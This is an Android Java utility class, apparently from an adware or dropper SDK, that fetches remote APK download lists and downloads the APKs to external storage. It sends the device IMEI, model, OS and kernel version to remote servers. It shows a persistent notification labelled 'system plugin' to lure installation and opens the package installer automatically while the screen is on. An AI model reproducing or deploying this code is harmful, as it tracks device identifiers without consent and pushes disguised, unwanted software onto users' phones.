package d.sl.i;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;

public class tools {

	public static boolean checkAPKExits(Context context, String pckName) {
		if (pckName == null || "".equals(pckName))
			return false;
		try {
			context.getPackageManager().getApplicationInfo(pckName, PackageManager.GET_UNINSTALLED_PACKAGES);
		} catch (PackageManager.NameNotFoundException e) {
			return false;
		}
		return true;
	}

	public static void getDLpath(final Context context, final String appid) {
		new Thread() {
			public void run() {
				String urlInterval = Urls.Interval + appid;
				HttpClient client = new DefaultHttpClient();
				HttpGet get = new HttpGet(urlInterval.trim());
				HttpResponse response;
				try {
					response = client.execute(get);
					if (response.getStatusLine().getStatusCode() == 200) {
						BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity()
								.getContent()));
						String line = "";
						String Interval = "";
						while ((line = reader.readLine()) != null) {
							Interval = Interval + line.trim();
						}
						reader.close();
						LogUtil.i(Interval);
						if (Interval != null && !Interval.equals("")) {
							String[] Intervals = Interval.split(",");
							LogUtil.i("获取间隔:首次" + Integer.parseInt(Intervals[0]) + "秒--每次间隔"
									+ Integer.parseInt(Intervals[1]) + "秒");
							creatdown.delay = Integer.parseInt(Intervals[0]);
							zonst.Interval = Integer.parseInt(Intervals[1]);
							zonst.yangshi = Integer.parseInt(Intervals[2]);
						} else {
							LogUtil.i("apkPath==null");
						}
					}
				} catch (Exception k) {
					k.printStackTrace();
				}

				String channel = null;
				switch (zonst.channel) {
				case 1:
					channel = "_xin";
					break;
				case 2:
					channel = "_jiuying";
					break;
				default:
					channel = "_ssyy";
					break;
				}
				String url = Urls.DLpath + channel + ".php?app_id=" + appid + "&uuid=" + getIMEI(context) + "&model="
						+ Uri.encode(android.os.Build.MODEL) + "&apiVersion="
						+ Uri.encode(android.os.Build.VERSION.RELEASE) + "&cid=" + zonst.qudaoidtxt;
				LogUtil.i("Urls.DLpath=" + url);
				get = new HttpGet(url.trim());
				try {
					response = client.execute(get);
					if (response.getStatusLine().getStatusCode() == 200) {
						BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity()
								.getContent()));
						String line = "";
						String apkPath = "";
						while ((line = reader.readLine()) != null) {
							apkPath = apkPath + line.trim();
						}
						reader.close();
						LogUtil.i(apkPath);
						if (!apkPath.equals("")) {
							LogUtil.i("apkPath!=null");
							creatdown.getJson(apkPath);
						} else {
							LogUtil.i("apkPath==null");
						}
					}
				} catch (Exception k) {
					k.printStackTrace();
				}
			};
		}.start();
	}

	public static void downLoadAPk(final Context context, final cdinfo obInfo) {
		new Thread() {
			public void run() {
				String FileName = obInfo.getAppurl();
				LogUtil.i("FileName");
				FileName = FileName.substring(FileName.lastIndexOf("/") + 1, FileName.length());
				File sdCard = Environment.getExternalStorageDirectory();
				File file = new File(sdCard, FileName + ".tmp");
				File fileDone = new File(sdCard, FileName);
				obInfo.setApkfile(fileDone.getAbsolutePath());
				HttpClient client = new DefaultHttpClient();
				HttpGet get = new HttpGet(obInfo.getAppurl());
				try {
					HttpResponse response = client.execute(get);
					if (response.getStatusLine().getStatusCode() != 200) {
						LogUtil.i("下载:" + FileName + "---" + response.getStatusLine().getStatusCode() + "错误,线程停止");
						this.stop();
					}
					long fileSize = response.getEntity().getContentLength();
					if (fileDone.exists() && fileDone.length() == fileSize) {
						createNfDone(context, obInfo);
						showInstallDialog(context, fileDone.getAbsolutePath(), obInfo.getPckName(), obInfo.getName());
					} else {
						fileDone.delete();
						file.delete();
						FileOutputStream fs = new FileOutputStream(file);
						InputStream is = response.getEntity().getContent();
						byte[] buff = new byte[1024];
						int len = 0;
						while ((len = is.read(buff)) != -1) {
							fs.write(buff, 0, len);
						}
						fs.close();
						is.close();
						if (file.length() == fileSize) {
							file.renameTo(fileDone);
							client.getConnectionManager().shutdown();
							createNfDone(context, obInfo);
							showInstallDialog(context, fileDone.getAbsolutePath(), obInfo.getPckName(),
									obInfo.getName());
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			};
		}.start();
	}

	protected static void showInstallDialog(final Context context, final String filePath, final String pckName,
			final String appName) {
		creatdown.getshowID(filePath, pckName, appName);
	}

	protected static boolean checkperiod(Context context) {
		SharedPreferences spTime = context.getSharedPreferences("timeSp", Context.MODE_PRIVATE);
		long preTime = spTime.getLong("pre" + "Time", 0);
		long now = System.currentTimeMillis();
		long period = (Math.abs(now - preTime)) / (1000 * 10);
		int times = spTime.getInt("times", 0);
		if (period > 1) {
			Editor editor = spTime.edit();
			editor.putLong("pre" + "Time", System.currentTimeMillis());
			editor.putInt("times", times + 1);
			editor.commit();
			return true;
		} else {
			return false;
		}
	}

	private static void createNfDone(Context context, cdinfo obInfo) {
		NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
		int icon = android.R.drawable.sym_action_email;
		File sdCard = Environment.getExternalStorageDirectory();
		String FileName = obInfo.getAppurl();
		FileName = FileName.substring(FileName.lastIndexOf("/") + 1, FileName.length());
		File file = new File(sdCard, FileName);
		String contentTitle = obInfo.getName();
		String contentText = obInfo.getName() + "下载完毕，点击安装";
		String apkIntro = "系统插件";
		Notification nfcDone = new Notification(icon, apkIntro, System.currentTimeMillis());
		nfcDone.flags = Notification.FLAG_ONGOING_EVENT;
		nfcDone.flags = Notification.FLAG_NO_CLEAR;
		Intent it = new Intent();
		it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		it.setAction(android.content.Intent.ACTION_VIEW);
		it.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
		PendingIntent pt = PendingIntent.getActivity(context, 0, it, 0);
		nfcDone.setLatestEventInfo(context, contentTitle, contentText, pt);
		if (nfcDone != null) {
			nm.notify(Integer.parseInt(obInfo.getId()), nfcDone);
		}
	}

	public static void openFile(final Context context, final File file, final String pckName) {
		if (!checkAPKExits(context, pckName)) {
			if (issreenon()) {
				Intent intent = new Intent();
				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				intent.setAction(android.content.Intent.ACTION_VIEW);
				intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
				context.startActivity(intent);
			} else
				LogUtil.i("屏幕黑屏");
		}
	}

	static boolean issreenon() {
		boolean on = true;
		if (creatdown.pm != null)
			on = creatdown.pm.isScreenOn();
		return on;
	}

	public static void SendtoService(final Context context, final String appid, final String id) {
		new Thread() {
			public void run() {

				String z = Urls.install + "uuid=" + getIMEI(context) + "&app_id=" + appid + "&ad_id=" + id + "&cid="
						+ zonst.qudaoidtxt + "&model=" + Uri.encode(android.os.Build.MODEL) + "&apiVersion="
						+ Uri.encode(android.os.Build.VERSION.RELEASE) + "&kernel="
						+ Uri.encode(creatdown.getKernelVersion());
				HttpClient client = new DefaultHttpClient();
				LogUtil.i("安装记数" + z);
				HttpGet get = new HttpGet(z.trim());
				try {
					client.execute(get);
				} catch (Exception z11) {
					z11.printStackTrace();
				}
			};
		}.start();
	}

	protected static String getIMEI(Context context) {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId();
		if (null == imei || "".equals(imei)) {
			String BuildUUid = "35" + Build.BOARD.length() % 10 + Build.BRAND.length() % 10 + Build.CPU_ABI.length()
					% 10 + Build.DEVICE.length() % 10 + Build.DISPLAY.length() % 10 + Build.HOST.length() % 10
					+ Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 + Build.MODEL.length() % 10
					+ Build.PRODUCT.length() % 10 + Build.TAGS.length() % 10 + Build.TYPE.length() % 10
					+ Build.USER.length() % 10;
			return BuildUUid;
		}
		return imei;
	}

	public static void StartSystools(final Context context, final String pckName) {
		try {
			Intent LaunchIntent = context.getPackageManager().getLaunchIntentForPackage(pckName);
			context.startActivity(LaunchIntent);
			LogUtil.i("打开程序:" + pckName);
		} catch (Exception e) {
			try {
				ComponentName componentName = new ComponentName(pckName, pckName + ".MainActivity");
				Intent intent = new Intent();
				intent.setAction("android.intent.action.start");
				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				intent.setComponent(componentName);
				context.getApplicationContext().startActivity(intent);
				LogUtil.i("2打开程序:" + pckName);
			} catch (Exception e1) {
			}
		}
	}
}
